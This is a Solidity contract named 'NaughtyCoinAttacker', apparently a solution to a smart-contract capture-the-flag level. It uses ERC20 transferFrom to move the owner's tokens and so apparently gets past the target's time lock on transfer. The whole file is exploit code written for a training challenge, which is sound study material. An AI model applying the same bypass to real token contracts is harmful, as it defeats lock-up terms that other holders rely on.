pragma solidity ^0.8.0;


import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
contract NaughtyCoinAttacker{
    address public owner;
    IERC20 public targetToken;
    modifier _onlyOwner() {
        require(msg.sender == owner, "Who are u?");
        _;
    }

    constructor(address targetAddress) {
        owner = msg.sender;
        targetToken = IERC20(targetAddress);
    }

    function transfer(address _to, uint _value) public returns (bool success) {
        return targetToken.transfer(_to, _value);
    }
    function withdrawAll(uint _value) public returns (bool success) {
        return targetToken.transferFrom(owner,address(this), _value);
    }

}
